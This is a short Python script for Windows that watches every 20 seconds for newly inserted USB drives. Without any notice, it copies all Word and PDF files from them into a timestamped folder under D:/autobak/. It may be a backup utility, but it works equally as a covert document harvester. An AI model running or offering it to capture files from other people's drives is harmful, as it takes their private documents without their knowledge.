import win32file
import os
import time
import shutil

def getremovabledisk():
    drives=[]
    sign=win32file.GetLogicalDrives()
    drive_all=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\",
                "J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\",
                "S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
    for i in range(25):
        if (sign&1<<i):
            if win32file.GetDriveType(drive_all[i])==2:
                free_bytes,total_bytes,total_free_bytes=win32file.GetDiskFreeSpaceEx(drive_all[i])
                if (total_bytes/1024/1024/1024)<33:
                    drives.append(drive_all[i])
    return drives
def copyfile(drives):
    target_dir='D:/autobak/'
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
    today=target_dir+time.strftime('%Y%m%d%H%M')+'/'
    if not os.path.exists(today):
        os.makedirs(today)
    for udisk in drives:
        for root, dirs, files in os.walk(udisk):
            for one in files:
                type = os.path.splitext(one)[1]
                if type == ".doc" or type == ".docx" or type == ".pdf":
                    if len(root)>3 and not os.path.exists(today+root[3:]):
                        os.makedirs(today+root[3:])
                    shutil.copy(root+'/'+one,today+root[3:]+'/'+one)
if __name__ == '__main__':
    drives_bk = []
    while 1:
        time.sleep(20)
        drives = getremovabledisk()
        if (drives != drives_bk) & (len(drives_bk) < len(drives)):
            # new U Disk
            drives_bk = drives
            copyfile(drives)
        if (drives != drives_bk) & (len(drives_bk) > len(drives)):
            # Disk remove
            drives_bk = drives